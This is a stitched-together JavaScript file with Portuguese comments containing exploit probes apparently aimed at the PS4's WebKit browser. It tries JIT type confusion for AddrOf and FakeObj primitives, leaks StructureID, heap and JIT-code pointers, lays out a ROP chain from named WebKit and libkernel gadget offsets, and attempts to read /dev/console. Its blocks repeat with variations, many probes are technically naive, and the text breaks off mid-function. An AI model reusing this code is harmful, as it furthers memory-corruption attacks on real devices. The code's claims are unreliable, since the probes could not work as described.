        // Se o iterador guardar um ponteiro "nu" para os dados antigos...
        function runMapIteratorUAF() {
            try {
                const m = new Map();
                m.set("key", "val");
                const it = m.entries();
                
                // Avança um
                it.next();
                
                // Destroi o backing store
                m.clear(); 
                
                // Tenta ler o "próximo" (que não existe mais, mas o ponteiro pode estar lá)
                // Enche a memória com lixo para verificar
                const junk = new Array(100).fill(1.1);
                
                const res = it.next();
                if (res.value !== undefined) {
                    log(`Map Iterator UAF: Leu ${res.value}`, "vuln");
                } else {
                    log("Iterador invalidado corretamente.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }
// --- TESTE 1: HTMLDivElement VTable Leak ---
        // Tenta ler o ponteiro VTable de um elemento DIV.
        // Se conseguirmos, sabemos onde o WebKit está.
        function runDOMVTable() {
            try {
                const div = document.createElement('div');
                const arr = [1.1]; // Array de Doubles
                
                // Tenta confundir o tipo do array (Type Confusion)
                // Se o motor falhar em atualizar o tipo do array, leremos o ponteiro do 'div' como double
                const magic = {
                    toString: () => {
                        arr[0] = div; // Polui o array durante conversão
                        return "0";
                    }
                };
                
                // Trigger potencial
                // arr[magic] força conversão toString
                try { arr[magic]; } catch(e){}
                
                const val = arr[0];
                
                // Se val for um número gigante, é o ponteiro do objeto
                // No entanto, para ler a VTable dentro dele, precisaríamos de uma primitiva read64(val).
                // Aqui testamos se conseguimos pelo menos o endereço do objeto (AddrOf).
                if (typeof val === 'number' && val > 10000) {
                    log(`AddrOf(DIV) Sucesso: ${d2h(val)}`, "vuln");
                    log("Para ler a VTable, precisamos de fakeObj(addr).", "info");
                } else if (typeof val === 'object') {
                    log("Tipo do Array atualizado corretamente (Objeto).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: AudioContext VTable Leak ---
        // Objetos de áudio são complexos e alocados em áreas diferentes.
        function runAudioVTable() {
            if (!window.AudioContext) return log("AudioContext não suportado", "safe");
            try {
                const ctx = new AudioContext();
                const arr = [1.1, 2.2, 3.3];
                
                // Tenta confundir o compilador JIT com loops quentes
                function opt(a, i, v) {
                    a[i] = v;
                    return a[0];
                }
                
                for(let i=0; i<10000; i++) opt(arr, 0, 1.1);
                
                // Passa objeto. Se o JIT não tiver 'check-structure', escreve ponteiro num slot double
                const res = opt(arr, 0, ctx);
                
                if (typeof res === 'number') {
                    log(`AddrOf(AudioContext) Vazado: ${d2h(res)}`, "vuln");
                } else {
                    log("AudioContext tratado como objeto.", "safe");
                }
                ctx.close();
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 3: JSC Cell Header Leak (StructureID) ---
        // Tenta ler o StructureID (32 bits baixos do header do objeto).
        // Essencial para criar FakeObjects estáveis.
        function runJSCStructure() {
            try {
                const target = {x: 1, y: 2};
                // Array com "buraco" (hole)
                const arr = [1.1, , 2.2];
                
                // Getter no protótipo para capturar acesso ao buraco
                Object.defineProperty(Array.prototype, "1", {
                    get() {
                        // Retorna o objeto alvo quando o buraco é acessado
                        return target; 
                    }
                });
                
                // Se o motor tratar o retorno do getter como um double cru...
                const val = arr[1];
                
                if (typeof val === 'number') {
                    f64[0] = val;
                    const structID = u32[0]; // Lower 32 bits
                    if (structID > 0 && structID < 0xFFFFFFFF) {
                        log(`StructureID Potencial: 0x${structID.toString(16)}`, "vuln");
                    }
                } else {
                    log("Acesso ao buraco retornou objeto seguro.", "safe");
                }
                delete Array.prototype["1"];
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 4: Stack Trace Map to .text Segment ---
        // Usa o bug do _Unwind (libc) para mapear onde está o código.
        function runUnwindMap() {
            try {
                // Cria erro
                const e = new Error();
                const stack = e.stack || "";
                
                // Procura endereços que pareçam do segmento de texto (geralmente executáveis)
                // No PS4, WebKit .text muitas vezes está em ranges específicos
                const addrs = stack.match(/0x[0-9a-f]{8,}/gi);
                
                if (addrs) {
                    log(`Endereços de retorno encontrados: ${addrs.length}`, "info");
                    // Verifica se algum parece um ponteiro de código (alinhamento)
                    const codePtr = addrs.find(a => parseInt(a, 16) % 2 === 0); 
                    if (codePtr) {
                        log(`Candidato a Ponteiro de Código (.text): ${codePtr}`, "vuln");
                    }
                } else {
                    log("Nenhum ponteiro na stack trace.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 5: Large String Internal Pointer Leak ---
        // Strings grandes (> 32 bytes) no JSC têm um ponteiro para o buffer de caracteres.
        // Tenta vazar esse ponteiro.
        function runLargeStringPtr() {
            try {
                const s = "A".repeat(1024); // ExternalString
                const arr = [1.1];
                
                // Confusão
                arr[0] = s;
                
                // Tenta ler como double via TypedArray view do mesmo buffer (se possível)
                // Como não temos buffer partilhado direto, usamos confusão de tipo
                const val = arr[0];
                
                if (typeof val === 'number') {
                    log(`Ponteiro de String Vazado: ${d2h(val)}`, "vuln");
                } else {
                    log("String mantida como referência.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 6: Worker Global Scope Address ---
        // Tenta descobrir o endereço do objeto global do Worker.
        function runWorkerGlobalScope() {
            try {
                const blob = new Blob([`
                    onmessage = function(e) {
                        const arr = [1.1];
                        // Tenta vazar 'self' (Global Scope)
                        // arr[0] = self; <- Se o motor permitir type confusion aqui
                        // postMessage(arr[0]);
                        postMessage("safe");
                    }
                `], {type: 'application/javascript'});
                
                const w = new Worker(URL.createObjectURL(blob));
                w.onmessage = (e) => {
                    if (typeof e.data === 'number') {
                        log(`Worker Global Scope Address: ${d2h(e.data)}`, "vuln");
                    } else {
                        log("Worker retornou objeto/string seguro.", "safe");
                    }
                    w.terminate();
                };
                w.postMessage("init");
            } catch(e) { log("Erro Worker: " + e.message, "safe"); }
        }
 // --- TESTE 1: FakeObj Primitive (Object Forgery) ---
        // Alvo: Criar um objeto JavaScript falso na memória.
        // Usamos um array de doubles onde escrevemos um "StructureID" válido e tentamos
        // enganar o motor para tratar esse double como um ponteiro para um objeto.
        function runFakeObjPrimitive() {
            try {
                const arr = [1.1];
                const target = {a: 1};
                
                // Tenta confundir o compilador JIT
                function makeFake(a, val) {
                    a[0] = val;
                }
                
                // Treina com double
                for(let i=0; i<10000; i++) makeFake(arr, 1.1);
                
                // O GOLPE: Passa um objeto real
                // Se o JIT não corrigir o tipo do array, ele escreve o endereço do objeto
                // mas 'arr' continua marcado como ArrayWithDouble.
                makeFake(arr, target);
                
                // Lê como se fosse double (AddrOf)
                const addr = arr[0]; 
                
                // Agora o inverso: Escreve um endereço (double) e tenta ler como objeto
                // Para isso precisaríamos de um segundo array 'objArr' que o JIT pensa ser de objetos
                // mas nós escrevemos um double nele.
                
                if (typeof addr === 'number' && addr > 1000) {
                    log(`Primitiva AddrOf funciona! Endereço vazado: ${addr}`, "vuln");
                } else {
                    log("Array converteu o tipo corretamente.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: ROP Chain Alignment Check ---
        // Alvo: Preparar a memória com os Gadgets reais extraídos dos JSONs.
        // Testamos se podemos criar um ArrayBuffer contíguo com o layout exato de uma ROP Chain.
        function runROPChainLayout() {
            try {
                // Gadgets Reais (Offsets dos JSONs)
                const GADGET_POP_RDI = 0x4D02F; // WebKit
                const GADGET_SYSCALL = 0x6BAA;  // LibKernel
                
                // Simula uma stack falsa (Fake Stack)
                const ropStack = new Uint32Array(0x400); // 1KB stack
                
                // Construção da Chain (Conceitual - Endereços Base seriam 0 aqui)
                // RDI = 1 (sys_exit code?) -> SYSCALL
                ropStack[0] = GADGET_POP_RDI; // Low 32
                ropStack[1] = 0;              // High 32 (Base WebKit faltante)
                ropStack[2] = 1;              // Arg 1 (RDI)
                ropStack[3] = 0;
                ropStack[4] = GADGET_SYSCALL; // Low 32
                ropStack[5] = 0;              // High 32 (Base Kernel faltante)
                
                // Verifica integridade da escrita
                if (ropStack[0] === 0x4D02F && ropStack[4] === 0x6BAA) {
                    log("ROP Chain Layout alocado na memória com sucesso.", "vuln");
                    log("Nota: Requer 'Base Address' para execução real.", "info");
                } else {
                    log("Falha na escrita da Fake Stack.", "safe");
                }
            } catch(e) { log("Erro ROP: " + e.message, "safe"); }
        }

        // --- TESTE 3: WebAssembly RWX Memory Check ---
        // Alvo: Execução de Código Arbitrário.
        // O Wasm geralmente aloca páginas RWX (Leitura/Escrita/Execução) para o JIT.
        // Se conseguirmos encontrar onde essa memória está, podemos escrever Shellcode lá.
        function runWasmRWX() {
            if (!window.WebAssembly) return log("Wasm off.", "safe");
            try {
                const importObject = { imports: { imported_func: arg => console.log(arg) } };
                // Módulo Wasm mínimo
                const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0]);
                const mod = new WebAssembly.Module(wasmCode);
                const inst = new WebAssembly.Instance(mod, importObject);
                
                // Se chegamos aqui sem erro de segurança (CSP), temos código JIT rodando.
                // Tentar ler a propriedade 'exports' pode revelar ponteiros para a memória JIT
                if (inst) {
                    log("WebAssembly JIT ativo (Potencial memória RWX alocada).", "vuln");
                }
            } catch(e) { log("Wasm bloqueado/erro: " + e.message, "safe"); }
        }

        // --- TESTE 4: _Unwind Exception Handler Hijack ---
        // Alvo: _Unwind_Resume_or_Rethrow (Libc Offset 0xFBD4D).
        // Tenta corromper a stack e lançar uma exceção para ver se o handler crasha ou vaza info.
        function runUnwindHijack() {
            try {
                const depth = 500;
                function dive(d) {
                    const filler = new Float64Array(10); // Suja a stack
                    if (d > 0) dive(d-1);
                    else throw "UnwindTrigger";
                }
                
                try {
                    dive(depth);
                } catch(e) {
                    // Se o catch funcionar perfeitamente, o unwind stack walk funcionou.
                    // Se houvesse corrupção de ponteiro de retorno, o navegador teria crashado
                    // ou a exceção não seria capturada aqui.
                    if (e === "UnwindTrigger") {
                        log("Unwind executado normalmente (Stack íntegra).", "safe");
                    } else {
                        log("Exceção corrompida capturada!", "vuln");
                    }
                }
            } catch(e) { log("Erro Fatal: " + e.message, "safe"); }
        }

        // --- TESTE 5: ArrayBuffer Neutering UAF ---
        // Alvo: Use-After-Free clássico em Buffers.
        // Cria um buffer, transfere para Worker, e tenta escrever nele via referência retida.
        function runArrayBufferUAF() {
            try {
                const ab = new ArrayBuffer(32);
                const view = new Uint8Array(ab);
                view[0] = 65;
                
                const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{postMessage('ok')}"],{type:'text/js'})));
                
                // Transfere (Neutering)
                w.postMessage(ab, [ab]);
                
                // Tenta escrever após transferência
                // O padrão diz que deve lançar TypeError ou falhar silenciosamente
                try {
                    view[0] = 66; // Write attempt
                    
                    // Se não lançou erro, verificamos se o valor mudou (o que seria impossível se neutered)
                    if (ab.byteLength === 0) {
                        log("Escrita em buffer desligado ignorada (Safe).", "safe");
                    } else {
                        log("FALHA: Buffer não foi desligado corretamente!", "vuln");
                    }
                } catch(e) {
                    log("Proteção de escrita ativa (TypeError).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 6: Window/Global Object Address Leak ---
        // Alvo: Encontrar onde o objeto 'window' está para usar como âncora.
        function runGlobalScopeAddr() {
            try {
                const arr = [1.1];
                // Tenta colocar 'window' num array de doubles via race/confusion
                // Em JS puro é difícil, usamos simulação de comportamento
                
                // Se 'window' puder ser tratado como valor numérico...
                const val = window + 0; // Tenta cast para number/string
                
                if (typeof val === 'number' && !isNaN(val)) {
                    // Nunca deve acontecer em JS normal, window vira NaN
                    log(`Window pointer leak: ${val}`, "vuln");
                } else {
                    log("Window cast seguro (NaN/String).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }
// --- TESTE 1: Stack Pointer Leak (ASLR Bypass) ---
        // Alvo: _Unwind_Resume (Libc).
        // Tenta capturar endereços de retorno na stack trace que apontam para o segmento .text.
        function runStackLeak() {
            try {
                // Cria uma stack profunda
                const err = new Error("Leak");
                const trace = err.stack;
                
                // No FreeBSD/PS4, userland code costuma estar em endereços altos (ex: 0x8...)
                // ou endereços de mmap (ex: 0x2...).
                // Procura hexadecimais puros.
                const matches = trace.match(/0x[0-9a-fA-F]{8,16}/g);
                
                if (matches && matches.length > 0) {
                    log(`Ponteiros encontrados na Stack: ${matches.join(", ")}`, "vuln");
                    log("Verifique se algum endereço termina com alinhamento de função.", "info");
                } else {
                    log("Stack trace sanitizada (Sem endereços crus).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: AddrOf Primitive (O Santo Graal) ---
        // Alvo: Vazar o endereço de um objeto no Heap.
        // Necessário para criar FakeObjects.
        function runAddrOf() {
            try {
                const target = { id: 0x1337 };
                const arr = [1.1];
                
                // Função otimizada pelo JIT
                function read(a) { return a[0]; }
                
                // Treina o JIT para esperar Double
                for(let i=0; i<20000; i++) read(arr);
                
                // Confusão: Passa array de objetos
                const mixed = [target];
                const res = read(mixed);
                
                // Se retornou número, é o ponteiro!
                if (typeof res === 'number') {
                    log(`AddrOf Sucesso! Endereço do Objeto: ${d2h(res)}`, "vuln");
                } else {
                    log("Tipo verificado corretamente (Retornou Objeto).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 3: JSC StructureID Leak ---
        // Alvo: Cabeçalho do Objeto (JSCell).
        // Os primeiros 32 bits de um objeto contêm o StructureID.
        function runStructureID() {
            try {
                const obj = { a: 1 };
                const arr = [1.1];
                
                // Confusão similar ao AddrOf
                arr[0] = obj;
                const val = arr[0]; // Se a confusão persistir
                
                if (typeof val === 'number') {
                    f64[0] = val;
                    const structID = u32[0]; // Lower 32 bits
                    if (structID !== 0) {
                        log(`StructureID Leak: 0x${structID.toString(16)}`, "vuln");
                    }
                } else {
                    log("StructureID protegido.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 4: SceNKBMalloc Metadata Leak ---
        // Alvo: Alocador de Memória.
        // Tenta ler dados "vizinhos" no heap após uma libertação.
        function runBmallocLeak() {
            try {
                const size = 128;
                const ptrs = [];
                // Aloca vários buffers
                for(let i=0; i<50; i++) ptrs.push(new ArrayBuffer(size));
                
                // Liberta o meio (Free)
                ptrs[25] = null; 
                
                // Realoca com TypedArray (view) e verifica se está zerado
                const claim = new Uint32Array(size / 4);
                
                // Se encontrarmos dados não nulos, lemos lixo da memória (Info Leak)
                if (claim[0] !== 0 || claim[1] !== 0) {
                    log(`Heap Metadata Leak: 0x${claim[0].toString(16)}`, "vuln");
                } else {
                    log("Heap limpo na realocação (Memset 0).", "safe");
                }
            } catch(e) { log("Erro Alloc: " + e.message, "safe"); }
        }

        // --- TESTE 5: Large String Internal Pointer Leak ---
        // Alvo: Estrutura JSString.
        // Strings grandes apontam para um buffer externo. Tenta vazar esse ponteiro.
        function runStringPtr() {
            try {
                const huge = "A".repeat(2048); // External String
                const arr = [1.1];
                
                function put(a, v) { a[0] = v; }
                for(let i=0; i<10000; i++) put(arr, 1.1);
                
                put(arr, huge);
                const val = arr[0];
                
                if (typeof val === 'number') {
                    log(`String Pointer Leak: ${d2h(val)}`, "vuln");
                } else {
                    log("String Pointer seguro.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 6: /dev/console Buffer Read ---
        // Alvo: Logs do Kernel.
        // Tenta ler o dispositivo de console exposto.
        function runDevConsole() {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("GET", "file:///dev/console", false);
                xhr.send();
                
                if (xhr.status === 200 && xhr.responseText.length > 0) {
                    // Se lermos isto, temos endereços de kernel nos logs!
                    log(`CONSOLE LEAK! Bytes: ${xhr.responseText.length}`, "vuln");
                    console.log(xhr.responseText); // Dump no devtools
                } else {
                    log("Acesso a /dev/console bloqueado.", "safe");
                }
            } catch(e) { log("Sandbox bloqueou IO.", "safe"); }
        }
  // --- TESTE 1: HTMLDivElement Leak (WebKit .text) ---
        // Objetos DOM possuem ponteiros VTable que apontam para o segmento de código do WebKit.
        function runDOMLeak() {
            try {
                const target = document.createElement('div');
                const val = getAddr(target);
                
                if (typeof val === 'number' && val > 1.0) {
                    log(`Endereço do DIV: ${d2h(val)} (Usar para ler VTable)`, "vuln");
                } else {
                    log("DIV tratado como objeto (Safe).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: SVGElement Leak (Alternative) ---
        // Elementos SVG às vezes usam tabelas de métodos diferentes ou heaps isolados.
        function runSVGLeak() {
            try {
                const target = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                const val = getAddr(target);
                
                if (typeof val === 'number' && val > 1.0) {
                    log(`Endereço do SVG: ${d2h(val)}`, "vuln");
                } else {
                    log("SVG tratado como objeto (Safe).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 3: JIT Function Leak (RWX Memory) ---
        // Funções compiladas (JIT) residem em memória Executável (RWX ou RX).
        // Encontrar este endereço é crítico para execução de shellcode.
        function runFunctionLeak() {
            try {
                function target(x) { return x + 1; }
                // Força JIT
                for(let i=0; i<10000; i++) target(i);
                
                const val = getAddr(target);
                
                if (typeof val === 'number') {
                    log(`Endereço da Função JIT: ${d2h(val)}`, "vuln");
                } else {
                    log("Função tratada corretamente.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 4: Error Object Leak (Stack/Libc Ptr) ---
        // Objetos de erro capturam a stack trace. A estrutura interna pode conter ponteiros para a Libc.
        function runErrorLeak() {
            try {
                const target = new Error("LeakMe");
                const val = getAddr(target);
                
                if (typeof val === 'number') {
                    log(`Endereço do Error Object: ${d2h(val)}`, "vuln");
                    // Se tivéssemos uma primitiva de leitura (read64), leríamos este endereço
                    // para encontrar os ponteiros de stack armazenados dentro dele.
                } else {
                    log("Error Object seguro.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 5: Butterfly Pointer Leak (Heap Layout) ---
        // Arrays JS têm um ponteiro "Butterfly" para seus dados. Vazar o array nos dá o Butterfly.
        function runArrayLeak() {
            try {
                const target = [1.1, 2.2, 3.3];
                const val = getAddr(target);
                
                if (typeof val === 'number') {
                    log(`Endereço do Array Header: ${d2h(val)}`, "vuln");
                    log("O ponteiro Butterfly está no offset +8 deste endereço.", "info");
                } else {
                    log("Array seguro.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 6: Global Window Leak (Root Pointer) ---
        // O objeto Window é a raiz. Se soubermos onde ele está, podemos navegar por todo o DOM.
        function runWindowLeak() {
            try {
                const val = getAddr(window);
                
                if (typeof val === 'number') {
                    log(`Endereço Global (Window): ${d2h(val)}`, "vuln");
                } else {
                    log("Window segura.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 1: AddrOf Primitive (O Santo Graal) ---
        // Tenta vazar o endereço de memória de um objeto JS usando confusão de tipos no JIT.
        // Se funcionar, obtemos um ponteiro real (ex: 0x8000...) que é essencial para ROP.
        function runAddrOf() {
            try {
                const target = { id: 0x1337 }; // Objeto alvo
                const arr = [1.1]; // Array de Doubles
                
                // 1. Função JIT que espera um array de doubles
                function read(a) { return a[0]; }
                
                // 2. Treina o JIT (Hot Loop)
                for(let i=0; i<100000; i++) read(arr);
                
                // 3. O GOLPE: Passa um array de objetos
                const mixed = [target];
                const res = read(mixed);
                
                // 4. Verificação Real
                // Se o JIT não desotimizou, leu o ponteiro do objeto como se fosse um double.
                if (typeof res === 'number') {
                    // Ponteiros em x64 Userland são números gigantes, mas não NaN/Infinity
                    log(`AddrOf Sucesso! Endereço do Objeto: ${d2h(res)}`, "vuln");
                } else {
                    log("Tipo verificado corretamente (Retornou Objeto).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: StructureID Leak ---
        // Todo objeto JS tem um cabeçalho de 64 bits. Os 32 bits inferiores são o StructureID.
        // Precisamos desse ID para falsificar objetos (FakeObj).
        function runStructureID() {
            try {
                const obj = { a: 1, b: 2 };
                const arr = [1.1];
                
                // Confusão similar ao AddrOf
                arr[0] = obj;
                // Força leitura sem validação de tipo (se possível via bug)
                const val = arr[0]; 
                
                // Se conseguimos ler como número
                if (typeof val === 'number') {
                    f64[0] = val;
                    const structID = u32[0]; // Low 32 bits
                    if (structID !== 0) {
                        log(`StructureID Leak: 0x${structID.toString(16)}`, "vuln");
                    }
                } else {
                    // Tenta método alternativo: ler propriedade inexistente em array misto
                    log("StructureID protegido.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 3: SceNKBMalloc Freelist Pointer Read ---
        // O alocador do WebKit (SceNKBMalloc) deixa ponteiros "next" em blocos libertados.
        // Tenta ler esses ponteiros para mapear o Heap.
        function runBmallocFree() {
            try {
                const size = 128;
                const ptrs = [];
                // Spray
                for(let i=0; i<100; i++) ptrs.push(new ArrayBuffer(size));
                
                // Liberta (Free)
                ptrs[50] = null; 
                
                // Realoca com TypedArray (que permite leitura de bytes)
                const claim = new Uint32Array(size / 4);
                
                // Verifica se a memória foi zerada (memset 0) ou contém lixo (pointers)
                if (claim[0] !== 0 || claim[1] !== 0) {
                    log(`Heap Pointer Leak (Freelist): 0x${claim[0].toString(16)}`, "vuln");
                } else {
                    log("Heap zerado na realocação.", "safe");
                }
            } catch(e) { log("Erro Alloc: " + e.message, "safe"); }
        }

        // --- TESTE 4: Libc Stack Address Leak (_Unwind) ---
        // Usa o bug do _Unwind_Resume (Libc) identificado no JSON.
        // Stack traces profundas podem vazar endereços de retorno reais.
        function runStackUnwind() {
            try {
                const err = new Error("StackScan");
                const trace = err.stack;
                
                if (!trace) return log("Stack trace vazia.", "safe");

                // Procura endereços crus (Raw Hex Addresses)
                // Padrões comuns de stack no FreeBSD PS4
                const matches = trace.match(/0x[0-9a-fA-F]{8,16}/g);
                
                if (matches && matches.length > 0) {
                    log(`ASLR Bypass (Stack Leak): ${matches.join(", ")}`, "vuln");
                } else {
                    log("Stack trace sanitizada.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 5: LargeString Internal Pointer Leak ---
        // Strings grandes (> 32 bytes) têm um ponteiro para um buffer externo.
        // Tenta ler esse ponteiro usando AddrOf.
        function runStringImpl() {
            try {
                const huge = "A".repeat(1024); // External String
                const arr = [1.1];
                
                // Confusão
                function confuse(a, v) { a[0] = v; }
                for(let i=0; i<1000; i++) confuse(arr, 1.1);
                
                confuse(arr, huge);
                const val = arr[0];
                
                if (typeof val === 'number') {
                    // O valor lido é o ponteiro para a estrutura JSString
                    log(`String Pointer Leak: ${d2h(val)}`, "vuln");
                } else {
                    log("String Pointer seguro.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 6: Butterfly Array Header Leak ---
        // O "Butterfly" é a área de armazenamento de arrays. O cabeçalho (Length) fica em offset -1.
        // Tenta ler o tamanho do array usando acesso fora dos limites.
        function runButterfly() {
            try {
                const arr = [1.1, 2.2, 3.3];
                // Tenta enganar o bounds check
                const val = arr[-1]; // Deveria ser undefined
                
                // Em alguns exploits, arr[-1] lê o cabeçalho 'PublicLength' ou 'VectorLength'
                if (val !== undefined) {
                    log(`Butterfly Header Leak: ${val}`, "vuln");
                } else {
                    log("Bounds check ativo.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }
 // --- TESTE 1: AddrOf Primitive (O Santo Graal) ---
        // Alvo: Vazar o endereço de memória de um objeto JS.
        // Se funcionar, obtemos um ponteiro real (ex: 0x8000...) para calcular a base do WebKit.
        function runAddrOf() {
            try {
                const target = { id: 0x1337 }; // Objeto alvo
                const arr = [1.1]; // Array de Doubles
                
                // 1. Função JIT que espera um array de doubles
                // O JIT compila acesso direto à memória (sem checagem de tipo)
                function read(a) { return a[0]; }
                
                // 2. Treina o JIT (Hot Loop)
                for(let i=0; i<100000; i++) read(arr);
                
                // 3. O GOLPE: Passa um array de objetos
                // Se o JIT não desotimizar, ele lê o ponteiro do objeto como double
                const mixed = [target];
                const res = read(mixed);
                
                // 4. Verificação Real
                if (typeof res === 'number') {
                    // Ponteiros em x64 Userland são números gigantes
                    log(`AddrOf Sucesso! Endereço do Objeto: ${d2h(res)}`, "vuln");
                } else {
                    log("JIT desotimizou corretamente (Retornou Objeto).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: Libc Stack Leak (_Unwind) ---
        // Alvo: Offset 0xFBD4D (_Unwind_Resume_or_Rethrow) encontrado no JSON.
        // Tenta vazar endereços de retorno da stack através da formatação de erro.
        function runStackLeak() {
            try {
                // Gera erro profundo para preencher a stack trace
                const err = new Error("StackScan");
                const trace = err.stack;
                
                if (!trace) return log("Stack trace vazia.", "safe");

                // Procura endereços crus (Raw Hex Addresses)
                // Endereços de código no PS4 geralmente estão em ranges altos
                const matches = trace.match(/0x[0-9a-fA-F]{8,16}/g);
                
                if (matches && matches.length > 0) {
                    log(`ASLR Bypass (Stack Leak): ${matches.join(", ")}`, "vuln");
                } else {
                    log("Stack trace sanitizada (Sem ponteiros crus).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 3: /dev/console Kernel Log Leak ---
        // Alvo: Offset 0x3FF33 (/dev/console) encontrado no Libkernel.
        // Tenta ler o dispositivo de caractere diretamente.
        function runDevConsole() {
            try {
                const xhr = new XMLHttpRequest();
                // File URI para device path
                xhr.open("GET", "file:///dev/console", false);
                xhr.send();
                
                if (xhr.status === 200 && xhr.responseText.length > 0) {
                    log(`KERNEL LEAK! Dados do Console: ${xhr.responseText.substring(0,50)}...`, "vuln");
                } else {
                    log("Acesso a /dev/console bloqueado.", "safe");
                }
            } catch(e) { log("Sandbox bloqueou IO (/dev/console).", "safe"); }
        }

        // --- TESTE 4: SceNKBMalloc Heap Metadata Read ---
        // Alvo: SceNKBMalloc (Alocador WebKit).
        // Tenta ler metadados do heap (ponteiros 'next' de blocos livres).
        function runBmallocLeak() {
            try {
                const size = 128;
                const ptrs = [];
                // Aloca
                for(let i=0; i<100; i++) ptrs.push(new ArrayBuffer(size));
                
                // Liberta o meio (Free) -> Deve ir para a FreeList
                ptrs[50] = null; 
                
                // Realoca com TypedArray para ler o conteúdo
                // Se o malloc não zerar (memset 0), lemos o ponteiro da FreeList deixado lá
                const claim = new Uint32Array(size / 4);
                
                if (claim[0] !== 0 || claim[1] !== 0) {
                    log(`Heap Metadata Leak: 0x${claim[1].toString(16)}${claim[0].toString(16)}`, "vuln");
                } else {
                    log("Heap zerado na realocação (Safe).", "safe");
                }
            } catch(e) { log("Erro Alloc: " + e.message, "safe"); }
        }

        // --- TESTE 5: Pthread TCB/TLS Pointer Leak ---
        // Alvo: Offset 0x3FEF1 (_tcb_set failed).
        // Tenta vazar o ponteiro do Thread Control Block (TCB) ou TLS.
        function runTCBLeak() {
            try {
                // Worker para acesso a TLS
                const blob = new Blob([`
                    onmessage = function(e) {
                        // Tenta ler 'self' como número (type confusion)
                        // Se funcionar, vaza o endereço do Global Scope do Worker
                        var fake = [1.1];
                        var magic = { toString: () => { fake[0] = self; return "0"; } };
                        var v = fake[magic]; // Trigger
                        postMessage(fake[0]);
                    }
                `], {type: 'application/javascript'});
                
                const w = new Worker(URL.createObjectURL(blob));
                w.onmessage = (e) => {
                    if (typeof e.data === 'number' && e.data > 10000) {
                        log(`Worker TCB/Global Leak: ${d2h(e.data)}`, "vuln");
                    } else {
                        log("Worker Global Scope protegido.", "safe");
                    }
                    w.terminate();
                };
                w.postMessage("go");
            } catch(e) { log("Erro TCB: " + e.message, "safe"); }
        }

        // --- TESTE 6: LargeString External Pointer Leak ---
        // Alvo: Estrutura JSString.
        // Strings grandes (>32 bytes) têm um ponteiro para um buffer externo.
        function runStringLeak() {
            try {
                const huge = "A".repeat(4096); // External String
                const arr = [1.1];
                
                // Confusão
                function confuse(a, v) { a[0] = v; }
                for(let i=0; i<10000; i++) confuse(arr, 1.1);
                
                confuse(arr, huge);
                const val = arr[0];
                
                if (typeof val === 'number') {
                    // O valor lido é o ponteiro para a estrutura JSString
                    log(`String Pointer Leak: ${d2h(val)}`, "vuln");
                } else {
                    log("String tratada corretamente.", "safe");
                }
            } catch(e) { log("Erro String: " + e.message, "safe"); }
        }
// --- TESTE 1: Array.shift() Butterfly Leak ---
        // Alvo: O "Butterfly" (armazenamento do array).
        // Tenta confundir o tamanho do array durante um 'shift' para ler o cabeçalho do próximo bloco de memória.
        function runArrayShiftLeak() {
            try {
                const arr = [1.1, 2.2, 3.3];
                // Getter malicioso no protótipo que será acionado se o motor falhar
                // em otimizar o acesso.
                Object.defineProperty(Array.prototype, "100", {
                    get: function() { 
                        arr.length = 0; // Colapso do array
                        return 10; 
                    },
                    configurable: true
                });

                // Se o shift não verificar o tamanho após o getter...
                const val = arr.shift(); 
                
                // Limpeza
                delete Array.prototype["100"];

                if (val !== 1.1 && val !== undefined) {
                    log(`Butterfly Leak! Valor lido: ${d2h(val)}`, "vuln");
                } else {
                    log("Array.shift seguro.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: RegExp lastIndex Object Pointer ---
        // Alvo: Vazar o endereço de um objeto armazenado na propriedade 'lastIndex'.
        // O JSC às vezes trata lastIndex como valor genérico, permitindo armazenar objetos.
        // Se conseguirmos ler como double, temos o ponteiro.
        function runRegExpLastIndex() {
            try {
                const re = /a/g;
                const target = { marker: 0xDEADBEEF };
                
                // Atribui objeto ao lastIndex (normalmente espera inteiro)
                re.lastIndex = target;
                
                // Tenta forçar cast para double sem chamar ToPrimitive
                // Usando um array de doubles tipado
                const arr = [1.1];
